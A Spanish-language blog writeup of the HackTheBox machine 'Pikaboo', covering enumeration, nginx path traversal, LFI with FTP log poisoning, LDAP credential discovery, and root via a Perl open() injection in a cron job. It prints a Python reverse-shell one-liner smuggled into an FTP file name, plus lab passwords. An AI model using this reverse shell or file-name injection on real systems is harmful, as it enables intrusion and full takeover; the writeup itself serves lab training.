---
layout: single
title: Pikaboo HackTheBox
date: 2023-11-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-pikaboo/logo.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - pentesting
tags:
  - Hacking Web
  - Log poisoning
---
Buenas a todos, en esta ocasión resolveremos una máquina Linux llamada "Pikaboo" la cual está catalogada como Hard en la plataforma de HackTheBox, disfruten el contenido.

![](/assets/images/htb-writeup-pikaboo/imagen.png)

---

Primero le lanzamos un Nmap para ver que puertos abiertos tiene la máquina.

```python

❯ nmap -sS -Pn -vvv --min-rate 5000 -n -p- 10.10.10.249
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-12 19:10 GMT
Initiating SYN Stealth Scan at 19:10
Scanning 10.10.10.249 [65535 ports]
Discovered open port 22/tcp on 10.10.10.249
Discovered open port 21/tcp on 10.10.10.249
Discovered open port 80/tcp on 10.10.10.249
Completed SYN Stealth Scan at 19:11, 14.23s elapsed (65535 total ports)
Nmap scan report for 10.10.10.249
Host is up, received user-set (0.26s latency).
Scanned at 2023-11-12 19:10:56 GMT for 14s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.33 seconds
           Raw packets sent: 68629 (3.020MB) | Rcvd: 68604 (2.744MB)

```
Sigamos con el escaneo para poder identificar qué servicios corre en cada puerto.

```python

❯ nmap -sCV -p21,22,80 10.10.10.249
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-12 19:14 GMT
Nmap scan report for 10.10.10.249
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Pikaboo
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
---

## Enumeración

Vemos que el puerto 21 osea el ftp esta abierto, nos conectaremos con el usuario Anonymous.

```python

❯ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:void): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 

```
Necesitaremos credenciales para acceder.

Támbien vemos que el puerto 80 está abierto, podemos lanzarle un WhatWeb para ver qué tecnologías corren por detrás.


```python

❯ whatweb http://10.10.10.249
http://10.10.10.249 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.249], Script, Title[Pikaboo], nginx[1.14.2]

```

Accedamos a la página web para poder analizarla un poco.

![](/assets/images/htb-writeup-pikaboo/web.png)

Si vamos a Pokatdex nos encontramos con esto:

![](/assets/images/htb-writeup-pikaboo/web2.jpg)

Podemos ver que hay un apartado "Admin", si entramos nos podemos encontrar con un panel de login.

![](/assets/images/htb-writeup-pikaboo/panel.jpg)

Intenté entrar usando credenciales predeterminadas como "admin:admin", "guest:guest" y "admin:password", pero no obtuve resultados.

Si buscamos en HackTricks la versión de Ngnix que nos habia reportado whatweb podemos ver algo bastante interesante.

![](/assets/images/htb-writeup-pikaboo/hacktricks.jpg)

Intentemos aplicar el "../" en el apartado "Admin" a ver que sucede.

![](/assets/images/htb-writeup-pikaboo/admin.jpg)

Y vemos que nos dice "Forbidden".

Apliquemos fuzzing para ver si encontramos algo interesante.

```python

❯ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.249/admin../FUZZ --hc=404,401 -t 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.249/admin../FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                    
=====================================================================

000000004:   403        9 L      28 W       274 Ch      "#"                                                                                                                                        
000000002:   403        9 L      28 W       274 Ch      "#"                                                                                                                                        
000000005:   403        9 L      28 W       274 Ch      "# This work is licensed under the Creative Commons"                                                                                       
000000009:   403        9 L      28 W       274 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                                                                      
000000008:   403        9 L      28 W       274 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                                                                               
000000010:   403        9 L      28 W       274 Ch      "#"                                                                                                                                        
000000011:   403        9 L      28 W       274 Ch      "# Priority ordered case sensative list, where entries were found"                                                                         
000000012:   403        9 L      28 W       274 Ch      "# on atleast 2 different hosts"                                                                                                           
000000013:   403        9 L      28 W       274 Ch      "#"                                                                                                                                        
000000014:   403        9 L      28 W       274 Ch      "http://10.10.10.249/admin../"                                                                                                             
000000006:   403        9 L      28 W       274 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                            
000000001:   403        9 L      28 W       274 Ch      "# directory-list-2.3-medium.txt"                                                                                                          
000000003:   403        9 L      28 W       274 Ch      "# Copyright 2007 James Fisher"                                                                                                            
000000007:   403        9 L      28 W       274 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                          
000001073:   301        9 L      28 W       314 Ch      "javascript"    <--                                                                                                                           
000045240:   403        9 L      28 W       274 Ch      "http://10.10.10.249/admin../"                                                                                                             
000095524:   200        105 L    302 W      5299 Ch     "server-status" <--
```
Encontramos directorios interesantes, si volvemos a la web y colocamos "javascript" nos devuelve lo siguiente:

![](/assets/images/htb-writeup-pikaboo/javascript.jpg)

Probemos colocar "server-startus".

![](/assets/images/htb-writeup-pikaboo/status.jpg)

Mirando un poco los directorios que nos muestra la web, hay una que me llamó la atención y es "/admin_staging"

Podemos ver que nos aplica un "Redirect".

![](/assets/images/htb-writeup-pikaboo/redirect.jpg)

Lo que podemos intentar es hacer fuzzing.

```bash

❯ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.249/admin../admin_staging/FUZZ --hc=404,401 -t 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.249/admin../admin_staging/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                    
=====================================================================

000000007:   200        882 L    2267 W     40554 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                          
000000090:   301        9 L      28 W       322 Ch      "docs"       <----                                                                                                                              
000000001:   200        882 L    2267 W     40554 Ch    "# directory-list-2.3-medium.txt"                                                                                                          
000000014:   200        882 L    2267 W     40554 Ch    "http://10.10.10.249/admin../admin_staging/"                                                                                               
000000003:   200        882 L    2267 W     40554 Ch    "# Copyright 2007 James Fisher"                                                                                                            
000000004:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000002:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000005:   200        882 L    2267 W     40554 Ch    "# This work is licensed under the Creative Commons"                                                                                       
000000006:   200        882 L    2267 W     40554 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                            
000000013:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000012:   200        882 L    2267 W     40554 Ch    "# on atleast 2 different hosts"                                                                                                           
000000011:   200        882 L    2267 W     40554 Ch    "# Priority ordered case sensative list, where entries were found"                                                                         
000000010:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000009:   200        882 L    2267 W     40554 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                                      
000000008:   200        882 L    2267 W     40554 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                                               
000000291:   301        9 L      28 W       324 Ch      "assets" <---

```
Y vemos que nos reportó docs y assets, si nos fijamos en el WhatWeb podemos ver que la página interpreta php.

Con Wfuzz buscaremos archivos con extensión php.

```bash
❯ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.249/admin../admin_staging/FUZZ.php --hc=404,401 -t 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.249/admin../admin_staging/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                    
=====================================================================

000000014:   403        9 L      28 W       274 Ch      "http://10.10.10.249/admin../admin_staging/.php"                                                                                           
000000125:   200        210 L    498 W      9627 Ch     "user"    <----                                                                                                                           
000000001:   200        882 L    2267 W     40554 Ch    "# directory-list-2.3-medium.txt"                                                                                                          
000000003:   200        882 L    2267 W     40554 Ch    "# Copyright 2007 James Fisher"                                                                                                            
000000007:   200        882 L    2267 W     40554 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                          
000000015:   200        882 L    2267 W     40554 Ch    "index"    <----                                                                                                                             
000000013:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000012:   200        882 L    2267 W     40554 Ch    "# on atleast 2 different hosts"                                                                                                           
000000011:   200        882 L    2267 W     40554 Ch    "# Priority ordered case sensative list, where entries were found"                                                                         
000000010:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000009:   200        882 L    2267 W     40554 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                                      
000000006:   200        882 L    2267 W     40554 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                            
000000008:   200        882 L    2267 W     40554 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                                               
000000005:   200        882 L    2267 W     40554 Ch    "# This work is licensed under the Creative Commons"                                                                                       
000000002:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000004:   200        882 L    2267 W     40554 Ch    "#"                                                                                                                                        
000000085:   200        803 L    4235 W     71643 Ch    "info"    <---                                                                                                                          
000002927:   200        515 L    1218 W     25205 Ch    "dashboard"  <---                                                                                                                              
000003719:   200        376 L    589 W      13778 Ch    "tables" <---

```
Tenemos varios directorios interesante, probé con "dashboard", "tables", "info" y user pero no encontré nada, si probamos con index.php podemos ver lo siguiente:

![](/assets/images/htb-writeup-pikaboo/panel.jpg)

Si vamos a User profile y nos fijamos en la url podemos ver algo interesante.

![](/assets/images/htb-writeup-pikaboo/panel2.jpg)

Probé si es vulnerable a LFI pero no obtuve resultados, la web no me muestra nada.

![](/assets/images/htb-writeup-pikaboo/panel3.jpg)

Recordemos que el puerto 21 esta abierto, lo que podriamos hacer es enumerar los "Log" e intentar hacer un "Log poisoning".

---

## Log Poinsoning

Si no sabes lo que es, por áca te dejo dos artículos que hablan a profundidad sobre esta vulnerabilidad.

```
https://lathack.com/vulnerabilidad-log-poisoning/

https://red-8.gitbook.io/red-blog/cheatsheets/vulnerabilidades/log-poisoning-lfi-to-rce

```
---

## Explotación

Nos dirigimos a la web y colocaremos "/var/log/vsftpd.log" 

![](/assets/images/htb-writeup-pikaboo/log.jpg)

Podemos ver los logs del archivo por conexiones ftp. En el log vsftpd hay un usuario llamado "pwnmeow".

Sabemos que la web interpreta php, lo que voy a hacer es injectar código php cuando entre por ftp y recargar la página para que me regrese una shell inversa.

Primero injecto el código php por ftp.

![](/assets/images/htb-writeup-pikaboo/php.jpg)

Luego me pongo en escucha por netcat.

```bash

❯ nc -lvnp 443
listening on [any] 443 ...


```
Al fallar la contraseña y recargar la página web me deberia dar una shell.

![](/assets/images/htb-writeup-pikaboo/shell.jpg)

Podemos ver que hemos ganado acceso a la máquina victima.

Hagamos un tratamiento de la TTY.

```
script /dev/null -c bash

export TERM=xterm

export SHELL=bash

Ctrl + z

stty raw -echo;fg

reset xterm

```
Si nos dirigimos al directorio /home/pwnmeow/ podemos ver la primera flag.

![](/assets/images/htb-writeup-pikaboo/flag.jpg)

---

## Escalada de privilegios

Luego de estar intentado varios comandos para ver si puedo escalar privilegios, encontre un cronjob que se ejecuta cada minuto como el usuario root.

```bash

www-data@pikaboo:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/csvupdate_cron <----
www-data@pikaboo:/$
```
Si vemos el contenido del archivo podemos ver que es un simple script en bash.

```bash

www-data@pikaboo:/$ cat /usr/local/bin/csvupdate_cron
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
www-data@pikaboo:/$ 

```
Le pregunté a ChatGPT qué hace exactamente este script y esto fue lo que me respondió:

---

¿Qué hace este script en bash? "for d in /srv/ftp/* do cd $d /usr/local/bin/csvupdate $(basename $d) *csv /usr/bin/rm -rf * done"

ChatGPT: Este siguiente script en Bash realiza las acciones:

Itera a través de todos los directorios dentro de "/srv/ftp/" utilizando el patrón "/srv/ftp/*".
Para cada directorio encontrado, cambia al directorio usando cd $d.
Luego ejecuta el comando /usr/local/bin/csvupdate $(basename $d) *csv. Este comando parece invocar un programa llamado "csvupdate" ubicado en "/usr/local/bin/", pasando como argumento el nombre del directorio actual (obtenido mediante ) $(basename $d)y todos los archivos que tienen una extensión ".csv" en ese directorio ( *csv).
Finalmente, después de actualizar los archivos CSV en el directorio actual, elimine todos los archivos en ese directorio utilizando el comando /usr/bin/rm -rf *. Esto borra todos los archivos de forma recursiva y forzada (sin solicitar confirmación).
En resumen, este script parece diseñado para procesar archivos CSV en directorios específicos dentro de "/srv/ftp/" utilizando el programa "csvupdate", y luego eliminar todos los archivos en esos directorios.

---

Investiguemos un poco lo que hay en "/usr/local/bin/csvupdate"

Si vemos bien, es un script en perl y al final del script hay algo que me llamó mucho la antención.

```bash

f($#ARGV < 1)
{
  die "Usage: $0 <type> <file(s)>\n";
}

my $type = $ARGV[0];
if(!exists $csv_fields{$type})
{
  die "Unrecognised CSV data type: $type.\n";
}

my $csv = Text::CSV->new({ sep_char => ',' });

my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";  <------

shift;
for(<>)
{
  chomp;
  if($csv->parse($_))
  {
    my @fields = $csv->fields();
    if(@fields != $csv_fields{$type})
    {
      warn "Incorrect number of fields: '$_'\n";
      next;
    }
    print $fh "$_\n";
  }
}

close($fh);

```
Podemos buscar en google "perl open injection".

![](/assets/images/htb-writeup-pikaboo/perl.jpg)

Por acá les dejo el link:

```
https://stackoverflow.com/questions/26614348/perl-open-injection-prevention

```
Lo que vamos a hacer es lo siguiente, sabemos que la máquina tiene el puerto 21 abierto, pero no nos podemos conectar porque no disponemos de credenciales.

Luego de estar enumerando un rato en el sistema en el directorio "/opt/pokeapi/config" hay un script en Python llamado "setting.py", si nos fijamos dentro del script hay unas crenciales.

![](/assets/images/htb-writeup-pikaboo/credenciales.jpg)

Podemos fijarnos si el servicio Ldap está activo.

```bash

www-data@pikaboo:/opt/pokeapi/config$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN     
tcp        0    138 10.10.10.249:45860      10.10.14.27:443         ESTABLISHED
tcp        1      0 127.0.0.1:81            127.0.0.1:47132         CLOSE_WAIT 
tcp        1      0 127.0.0.1:81            127.0.0.1:47162         CLOSE_WAIT 
tcp        0      0 10.10.10.249:45830      10.10.14.27:443         ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::21                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
www-data@pikaboo:/opt/pokeapi/config$  

```
Y sí, efectivamente esta activo en forma local.

Dentro de la máquina podemos usar ldapsearch.

Enumerando un poco con ldapsearch me encuentro unas cadenas en base64

```bash

www-data@pikaboo:/opt/pokeapi/config$ ldapsearch -x -h 127.0.0.1 -w 'J~42%W?PFHl]g' -b "dc=pikaboo,dc=htb" -D "cn=binduser,ou=users,dc=pikaboo,dc=htb"
# extended LDIF
#
# LDAPv3
# base <dc=pikaboo,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# pikaboo.htb
dn: dc=pikaboo,dc=htb
objectClass: domain
dc: pikaboo

# ftp.pikaboo.htb
dn: dc=ftp,dc=pikaboo,dc=htb
objectClass: domain
dc: ftp

# users, pikaboo.htb
dn: ou=users,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# pokeapi.pikaboo.htb
dn: dc=pokeapi,dc=pikaboo,dc=htb
objectClass: domain
dc: pokeapi

# users, ftp.pikaboo.htb
dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, ftp.pikaboo.htb
dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== <---

# binduser, users, pikaboo.htb
dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: Sn40MiVXP1BGSGxdZw== <----

# users, pokeapi.pikaboo.htb
dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, pokeapi.pikaboo.htb
dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# search result
search: 2
result: 0 Success

# numResponses: 11
# numEntries: 10
www-data@pikaboo:/opt/pokeapi/config$ 
```

Lo que me interesa es esta información.

```bash

# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

```
Veamos qué contiene la cadena en base64

```bash
www-data@pikaboo:/opt/pokeapi/config$ echo "X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==" | base64 -d; echo
_G0tT4_C4tcH_'3m_4lL!_
www-data@pikaboo:/opt/pokeapi/config$

```
Nos reportó unas credenciales, probemos si nos podemos conectar por ftp con el usuario "pwnmeow".

```bash

❯ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:void): pwnmeow
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Pudimos acceder por ftp, si listamos los archivo vamos a ver el mismo contenido que hay en "/srv/ftp/".

Intente subir un archivo pero no me dejó, entré al último directorio llamado "versions", y pude subir un archivo que habia creado llamado "hello.txt".
 
```bash

ftp> cd versions
250 Directory successfully changed.
ftp> put hello.txt
local: hello.txt remote: hello.txt
229 Entering Extended Passive Mode (|||37958|)
150 Ok to send data.
100% |***************************************************************************************************************************************************************|     5       73.98 KiB/s    00:00 ETA
226 Transfer complete.
5 bytes sent in 00:00 (0.00 KiB/s)
ftp> 

```
Recordando el posts sobre "perl open injection"	haremos lo siguiente:

Primero yo voy a usar un revshell en Python que termine usando la extensión ".cvs" y con put lo voy a subir al ftp, pero antes hay que ponerse en escucha por "NC".

---

Nos ponemos en escucha por nc.

```bash

❯ sudo nc -nlvp 443
[sudo] password for void: 
listening on [any] 443 ...



```

Para subir la revshell en Python les debe quedar asi:

```python
"|python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("\"10.10.14.27\"",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("\"sh\"")';.csv"

```
Subamos la revshell de python al ftp.

```bash

ftp> cd versions
250 Directory successfully changed.
ftp> put "|python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("\"10.10.14.27\"",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("\"sh\"")';.csv"
local: |python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.27",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';.csv remote: |python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.27",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';.csv
229 Entering Extended Passive Mode (|||44973|)
150 Ok to send data.
sh: 1: .csv: not found
226 Transfer complete.
ftp> 

```

Volvemos al nc y vemos que ganamos acceso como root, recuenden que una vez que gane acceso se salen de la shell y se vuelven a poner en escucha, esto se debe porque la tarea crob se ejecuta cada unos minutos.

```bash

# whoami
whoami
root
# pwd
pwd
/home/void/HackTheBox/Pikaboo/content
# exit
exit
❯ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.249] 45868
# whoami
whoami
root
# pwd
pwd
/srv/ftp/versions
# cd /root
cd /root
# ls
ls
root.txt  vsftpd.log
# cat root.txt
cat root.txt
5680f12063f4e16faf5922e6ec559389
# ifconfig
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.249  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:554c  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:554c  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:55:4c  txqueuelen 1000  (Ethernet)
        RX packets 371477  bytes 66506127 (63.4 MiB)
        RX errors 0  dropped 229  overruns 0  frame 0
        TX packets 320700  bytes 166253173 (158.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2953855  bytes 345563993 (329.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2953855  bytes 345563993 (329.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

# id
id
uid=0(root) gid=0(root) groups=0(root)
#  

```
Eso es todo, espero que se haya entendido.

Gracias por leer :)
